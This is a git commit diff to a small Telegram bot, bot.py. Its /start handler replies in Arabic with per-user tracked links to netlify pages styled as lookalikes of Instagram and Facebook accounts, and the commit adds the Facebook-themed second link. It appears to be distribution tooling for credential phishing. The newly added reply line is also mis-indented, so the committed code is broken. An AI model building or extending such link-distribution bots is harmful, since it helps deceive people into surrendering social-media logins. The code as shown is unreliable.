f8d8ab250ae76adc634993ae0f62de7553718e06
lokmanetnx-lang <lokmanetnx@gmail.com>
2026-08-01 15:06:39 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -7,7 +7,11 @@ bot = telebot.TeleBot(TOKEN)
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
-    custom_link = f"https://instgram-account-ginxl9n.netlify.app/?id={user_id}"
-    bot.reply_to(message, f"مرحباً بك!\nتفضل رابطك المخصص:\n{custom_link}")
+    custom_link = f"https://instagram-account-ginxl9n.netlify.app/?id={user_id}"
+    second_link = f"https://account-faceboo-k-ginxil9n.netlify.app/?id={user_id}"  # استبدل هذا الرابط بالرابط الثاني الذي تريده
+    
+        bot.reply_to(message, f"مرحباً بك!\nتفضل رابطك المخصص:\n{custom_link}\n\nورابطك الثاني:\n{second_link}\n\nDedication to FDZ 🖤")
+
+
 
 bot.infinity_polling()
